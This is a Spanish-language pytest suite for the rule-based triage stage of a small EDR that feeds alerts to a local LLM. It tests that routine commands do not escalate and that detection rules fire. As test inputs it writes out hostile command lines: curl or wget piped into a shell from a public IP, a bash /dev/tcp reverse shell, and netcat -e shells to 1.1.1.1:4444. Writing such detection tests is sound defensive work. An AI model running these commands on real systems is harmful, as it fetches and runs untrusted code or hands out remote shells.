"""Tests del triaje determinista.

Lo que se comprueba aquí no es sólo que las reglas disparen, sino sobre todo que
**no** disparen con actividad corriente. Un triaje que escala de más devuelve el
sistema al problema que venía a resolver: el prompt se llena de ruido y el modelo
razona peor, no mejor.

Los casos benignos salen de actividad medida en esta máquina, no inventada: VS
Code sondeando `git`, Docker lanzando `runc`, y peticiones a Ollama en
`127.0.0.1:11434`.
"""

import pytest

from edr import config, triage


def ev(filename, cmdline="", kind=None):
    return {"filename": filename, "cmdline": cmdline,
            "kind": kind or config.KIND_EXECVE}


# ── Actividad corriente: no debe escalar ───────────────────────

@pytest.mark.parametrize("evento", [
    ev("/usr/bin/grep", "-r foo"),
    ev("/usr/bin/git", "status --porcelain"),
    ev("/usr/bin/runc", "--root /var/run/docker/runtime-runc/moby"),
    ev("/usr/bin/curl", "-s https://api.github.com/health"),
    ev("/bin/sh", "-c ls -la"),
    ev("/usr/bin/python3", "orchestrator.py"),
])
def test_la_actividad_corriente_no_escala(evento):
    assert not triage.should_escalate(evento)


def test_una_peticion_a_la_propia_infraestructura_no_escala():
    """Regresión: una IP en crudo es señal, pero 127.0.0.1 es Ollama.

    La versión ingenua de la regla —"URL con IP literal"— se dispararía con cada
    petición del propio EDR a su modelo. Se exige que la dirección sea además
    encaminable por internet.
    """
    assert not triage.should_escalate(
        ev("/usr/bin/curl", "-s http://127.0.0.1:11434/api/tags"))
    assert not triage.should_escalate(
        ev("/usr/bin/wget", "-q http://192.168.1.10/paquete.deb"))


def test_las_direcciones_de_documentacion_tampoco_cuentan():
    """`is_global` excluye también los rangos reservados de la RFC 5737.

    Conviene tenerlo presente al montar una demo: la IP de ejemplo de manual
    (198.51.100.x) NO dispara la regla, hace falta una dirección real.
    """
    assert not triage.should_escalate(
        ev("/usr/bin/curl", "-s http://198.51.100.7/x.sh"))


def test_un_evento_vacio_no_escala():
    assert triage.assess({}) == (0, [])
    assert triage.assess({"filename": "", "cmdline": ""}) == (0, [])


# ── Cada regla, por separado ───────────────────────────────────

def test_ejecucion_desde_un_directorio_escribible_por_cualquiera():
    for ruta in ("/tmp/x", "/var/tmp/x", "/dev/shm/x", "/run/shm/x"):
        _, reglas = triage.assess(ev(ruta))
        assert "exec_from_world_writable" in reglas, ruta


def test_binario_oculto():
    _, reglas = triage.assess(ev("/home/ivan/.cache/.x"))
    assert "hidden_binary" in reglas

    # Un directorio oculto en la ruta no cuenta: lo que importa es el binario.
    _, reglas = triage.assess(ev("/home/ivan/.local/bin/herramienta"))
    assert "hidden_binary" not in reglas


def test_tuberia_a_un_shell():
    for orden in ("-c curl http://x/y | sh",
                  "-c wget -O - http://x/y|bash",
                  "-c cat x | /bin/sh"):
        _, reglas = triage.assess(ev("/bin/bash", orden))
        assert "pipe_to_shell" in reglas, orden


def test_descarga_directa_a_un_shell():
    _, reglas = triage.assess(ev("/bin/bash", "-c curl -s http://x/y.sh | sh"))
    assert "downloader_to_shell" in reglas


def test_descarga_desde_una_ip_publica_en_crudo():
    _, reglas = triage.assess(ev("/usr/bin/curl", "-s http://1.1.1.1/x.sh"))
    assert "download_from_public_ip" in reglas

    # Un dominio no es señal: es lo normal.
    _, reglas = triage.assess(ev("/usr/bin/curl", "-s http://ejemplo.com/x.sh"))
    assert "download_from_public_ip" not in reglas


def test_shell_redirigido_a_un_socket():
    """La reverse shell canónica en bash, sin herramientas externas."""
    _, reglas = triage.assess(
        ev("/bin/bash", "-c bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"))
    assert "shell_net_redirect" in reglas


def test_netcat_ejecutando_un_programa():
    for orden in ("-e /bin/sh 1.1.1.1 4444", "-lvnp 4444 -e /bin/bash"):
        _, reglas = triage.assess(ev("/usr/bin/nc", orden))
        assert "netcat_exec" in reglas, orden

    # netcat a secas es una herramienta legítima de diagnóstico.
    _, reglas = triage.assess(ev("/usr/bin/nc", "-z 127.0.0.1 22"))
    assert "netcat_exec" not in reglas


# ── El umbral: una señal débil no basta, dos sí ────────────────

def test_una_sola_senal_debil_no_alcanza_el_umbral():
    """Compilar o ejecutar algo en /tmp es corriente y no debe despertar al modelo."""
    severidad, reglas = triage.assess(ev("/tmp/build.sh"))
    assert reglas == ["exec_from_world_writable"]
    assert severidad < config.TRIAGE_THRESHOLD


def test_dos_senales_debiles_si_alcanzan_el_umbral():
    """Ejecutar desde /tmp algo cuyo nombre empieza por punto ya no es corriente."""
    severidad, reglas = triage.assess(ev("/tmp/.systemd-update", "600"))
    assert set(reglas) == {"exec_from_world_writable", "hidden_binary"}
    assert severidad >= config.TRIAGE_THRESHOLD


def test_las_dos_ordenes_de_la_demo_caen_a_lados_opuestos():
    """Hoy generan el mismo evento; con la línea de órdenes son distinguibles."""
    benigna = ev("/usr/bin/curl", "-s https://api.github.com/health")
    maliciosa = ev("/bin/bash", "-c curl -s http://1.1.1.1/x.sh | sh")

    assert not triage.should_escalate(benigna)
    assert triage.should_escalate(maliciosa)


def test_el_umbral_se_puede_mover_sin_tocar_codigo():
    evento = ev("/tmp/build.sh")
    assert not triage.should_escalate(evento)
    assert triage.should_escalate(evento, threshold=10)


# ── Filtro de alertas ──────────────────────────────────────────

def test_una_carga_de_modulo_siempre_es_alerta():
    """Son privilegiadas, escasas, y el caso que el sistema ya trataba."""
    assert triage.is_alert({"kind": config.KIND_MODULE_LOAD, "comm": "modprobe"})


def test_un_exec_solo_es_alerta_por_encima_del_umbral():
    assert triage.is_alert(
        {"kind": config.KIND_EXECVE, "severity": 70})
    assert not triage.is_alert(
        {"kind": config.KIND_EXECVE, "severity": 40})


def test_un_exec_sin_severidad_se_evalua_al_vuelo():
    """Red de seguridad para eventos que no pasaron por el sensor."""
    assert triage.is_alert(ev("/tmp/.systemd-update", "600"))
    assert not triage.is_alert(ev("/usr/bin/grep", "-r foo"))


def test_un_tipo_de_evento_desconocido_no_es_alerta():
    """Los sensores de la fase 4 tendrán que declararse aquí explícitamente."""
    assert not triage.is_alert({"kind": "futuro_sensor", "pid": 1})


# ── Estabilidad de los slugs ───────────────────────────────────

def test_cada_regla_tiene_peso_declarado():
    """Un slug sin peso reventaría al sumar; y los slugs se agregan en el lab."""
    reglas_emitidas = set()
    for evento in (ev("/tmp/.x", "-c curl http://1.1.1.1/y | sh"),
                   ev("/usr/bin/nc", "-e /bin/sh 1.1.1.1 4444"),
                   ev("/bin/bash", "-c bash -i >& /dev/tcp/1.1.1.1/4444")):
        reglas_emitidas.update(triage.assess(evento)[1])

    assert reglas_emitidas <= set(triage.WEIGHTS)
    assert reglas_emitidas, "los casos de prueba deberían disparar algo"
